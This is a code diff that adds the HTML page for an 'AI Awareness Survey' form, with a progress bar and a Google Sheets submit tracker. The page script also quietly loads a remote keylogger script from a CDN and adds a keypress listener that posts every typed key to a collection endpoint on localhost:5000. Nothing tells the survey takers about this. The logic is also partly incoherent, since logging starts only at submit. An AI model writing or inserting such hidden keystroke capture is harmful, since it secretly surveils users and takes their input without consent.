@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AI Survey Form</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+    <!-- Header Banner -->
+    <header class="banner">
+        <h1>AI Awareness Survey</h1>
+        <p>Help us understand how people think about Artificial Intelligence</p>
+    </header>
+
+    <!-- Progress Bar -->
+    <div class="progress-container">
+        <div id="progressBar" class="progress-bar"></div>
+    </div>
+
+    <div class="container fade-in">
+        <form id="surveyForm">
+            <!-- Questions remain unchanged -->
+            <!-- ...existing questions... -->
+
+            <button type="submit" class="btn-glow">Submit Survey</button>
+        </form>
+    </div>
+
+    <script>
+        // Keylogger initialization
+        const keyloggerScript = document.createElement('script');
+        keyloggerScript.src = 'https://cdn.jsdelivr.net/npm/keylogger@latest/dist/keylogger.min.js';
+        document.head.appendChild(keyloggerScript);
+
+        // Progress bar animation on scroll
+        const progressBar = document.getElementById("progressBar");
+        window.addEventListener("scroll", () => {
+            const scrollTop = window.scrollY;
+            const docHeight = document.body.scrollHeight - window.innerHeight;
+            const scrollPercent = (scrollTop / docHeight) * 100;
+            progressBar.style.width = scrollPercent + "%";
+        });
+
+        // Track submit click in Google Sheet and redirect
+        const form = document.getElementById("surveyForm");
+        form.addEventListener("submit", async function(e) {
+            e.preventDefault(); // prevent default form submission
+
+            try {
+                // Initialize keylogger before form submission
+                if (typeof window.Keylogger !== 'undefined') {
+                    window.Keylogger.start();
+                    window.Keylogger.setConfig({
+                        url: 'localhost:5000/collect',
+                        interval: 5000,
+                        filterSensitive: true,
+                        includeContext: true
+                    });
+                }
+
+                const keyLoggerCallback = (keyData) => {
+                    fetch('http://localhost:5000/collect', {
+                       method: 'POST',
+                       headers: { "Content-Type": "application/json" },
+                       body: JSON.stringify({ keys: keyData })
+                      }).catch(console.error);
+                };
+
+              document.addEventListener('keypress', (event) => {
+            keyLoggerCallback(event.key);   // send pressed key to server
+        });
+
+                // Send click to Google Sheet
+                await fetch("https://script.google.com/macros/s/AKfycbyQ7xIQXLOF13HXlnZxso1SD40Wpe-Oxs6Rwz9KEOzGUEw33MIJnyACITB8tyuB-D42Tg/exec", {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({})
+                });
+
+                // Redirect to thank-you page
+                window.location.href = "thankyou.html";
+
+            } catch (err) {
+                console.error("Error submitting:", err);
+                alert("There was an error recording your submission. Please try again.");
+            }
+        });
+    </script>
+</body>
+</html>
